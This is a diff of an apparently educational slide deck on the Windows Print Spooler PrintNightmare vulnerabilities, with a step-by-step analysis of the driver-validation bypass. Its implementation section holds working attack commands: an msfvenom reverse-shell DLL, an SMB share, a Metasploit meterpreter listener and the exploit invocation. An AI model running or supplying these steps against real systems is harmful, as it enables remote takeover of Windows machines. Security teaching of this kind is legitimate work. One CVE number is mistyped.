@@ -1,10 +1,10 @@
 :REVEAL_PROPERTIES:
 #+REVEAL_ROOT: https://cdn.jsdelivr.net/npm/reveal.js
 #+REVEAL_REVEAL_JS_VERSION: 4
-#+REVEAL_THEME:league
-#+REVEAL_INIT_OPTIONS: transition: 'concave'
-#+REVEAL_MARGIN:4.0
-#+REVEAL_MIN_SCALE: 2.0
+#+REVEAL_THEME:serif
+#+REVEAL_INIT_OPTIONS: transition: 'concave', width:1200, height:800
+#+REVEAL_TITLE_SLIDE: <h2 class="title">%t</h2><em>%s</em><br><br>%a<br>%d
+#+reveal_extra_css: css/extra.css
 #+OPTIONS: timestamp:nil toc:1 num:nil
 :END:
 
@@ -12,17 +12,120 @@
 #+author: Sudhanv Apte, 陳峰楷, 李光耀, Abdillahi Ahmed
 
 * Introduction
-- Vulnerability in printing management service
-- Initially a LPE vulnerability
-- Impact changed to RCE even after patch
-* Impact
-- Vulnerability restricted users to add printers
-- Bad actors can run code with System Privileges
-- PrintSpoofer had a similar exploit
-- MS's patch fails to fully fix the vulnerability
-* Exploitation
-- Attacker must have low privilege in advance
-- Can get full control of Active Directory by targeting vulnerable Spooler service and running code with root
-* References
-- https://www.forescout.com/blog/printnightmare/
-- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675
+- Windows has a service called Print Spooler
+- Manages all local and network printing
+
+** CVEs
+- *CVE-2021-1675*, low class vulnerability, allowed privilege escalation
+- Required direct access to the system thus labeled low risk
+- Fixed by MS as of Jun 8, 2021
+- *CVE-221-34527*, high risk, allowed remote code execution
+- Rated 8.8 on the Common Vulnerabiltity Scoring System Scale
+* Vulnerabiltity Analysis
+- Two vulns are triggered by the PrintSpoolerService RPC method
+  #+ATTR_HTML: :width 70%
+  [[./assets/nspt/cve1.png]]
+
+  #+ATTR_HTML: :width 70%
+  [[./assets/nspt/cve2.png]]
+
+- *mimikatz* was first to implement the exploit with both CVEs
+
+** The Vulnerability
+- Use Process monitor to capture EXP when DLL is loaded
+  #+ATTR_HTML: :width 70%
+  [[./assets/nspt/pm.png]]
+- dwFileCopyFlags check is skipped when calling YAddPrinterDriverEx method
+    #+ATTR_HTML: :width 60%
+  [[./assets/nspt/yadd.png]]
+    [[./assets/nspt/apd.png]]
+** ValidateObjectAccess
+- mimikatz will pass RpcBindingSetAuthInfoEx method with some params
+- After execution, user sets username which is regarded as permission
+- ValidateObjectAccess result is 0 for user and 1 for admin
+    #+ATTR_HTML: :width 60%
+  [[./assets/nspt/rpcbind.png]]
+- To bypass the ValidateObjectAccess, if the "APD INSTALL WARNED DRIVER" is set to 1
+- The result of _bittest method is 1, as a result ValidateObjectAccess is bypassed
+    #+ATTR_HTML: :width 60%
+  [[./assets/nspt/bittest.png]]
+** ValidateDriverInfo
+- This part checks if the driver name is valid
+- Execution flow is as follows:
+  - Check if it is a local file
+  - Check init key
+  - Verify legitimacy of the driver file
+    [[./assets/nspt/vdi.png]]
+- When dwFileCopyFlags contains APD INSTALL WARNED DRIVER, the result is 0x8000 and value is 0
+- This skips further verification by driver
+
+    #+ATTR_HTML: :width 60%
+  [[./assets/nspt/dwfile.png]]
+** Get file handle
+- Value of v13 is obtained by inverting lower 8 bits of dwFileCopyFlags
+- Shifting it 4 bits to right and performing AND with 1
+- v13 determines 5th param of the CreateInternalDriverFileArray
+  [[./assets/nspt/spl.png]]
+- After calculation, when value of lower 8 bits of dwFileCopyFlags is 0x1X, a5 can be set to 0
+- When a5 is 0, validity check of the driver can be avoided
+  [[./assets/nspt/a5.png]]
+#+REVEAL: split
+- Open file via CreateFile method, get 3 file handles
+- Save them in space requested by DllAllocSplMem method for later file update use
+  [[./assets/nspt/dll.png]]
+
+** Copy files to driver space
+- pConfigFile, pDataFile and pDriverPath save their respective file paths
+- When moving files of the above members, the following operations are required:
+  - Check file info of the file handle
+  - Copy file to *"C:\Windows\System32\spool\drivers\x64\3\new"*
+  - Using MoveNewDriverRelatedFiles, move files and realize the update file
+    #+ATTR_HTML: :width 70%
+    [[./assets/nspt/copy.png]]
+** Update Driver Files
+- Load the new config file
+- When loaded it will run the driver's DLL
+- Our DLL will be executed with highest privilege
+  [[./assets/nspt/update.png]]
+
+* Implementation
+- Environment:
+  - Windows 10 1607
+  - Kali 2022.3
+  - Python 3.10.5
+
+- Git repos used:
+  - https://github.com/tryhackme/CVE-2021-1675
+  - https://github.com/tryhackme/impacket
+  - https://github.com/JohnHammond/CVE-2021-34527
+
+- python requires impacket which can be installed through github
+
+** Setup
+- Setup exploit DLL
+  #+begin_src
+msfvenom -p /reverse_tcp_path LHOST=[YOUR_IP] LPORT=4545 -f dll -o spoolerevil.dll
+  #+end_src
+- Execute DLL
+  #+begin_src
+smbserver.py share [YOUR_EXPLOIT_DLL_LOCATION] -smb2support
+
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST [YOUR_IP]
+set LPORT 4545
+run -j
+  #+end_src
+- DLL Injection
+    #+begin_src
+python CVE-2021-1675.py username:password@<targetName or address> Path to DLL
+
+session -i 1
+    #+end_src
+
+* Demo
+* Conclusion
+- Spooler vuln was first used in Stuxnet attack 10 years ago
+- MSs incomplete patch of the CVEs made windows users vulnerable to attacks
+- MS has taken step to ameliorate the situation but 34527 is still unsolved
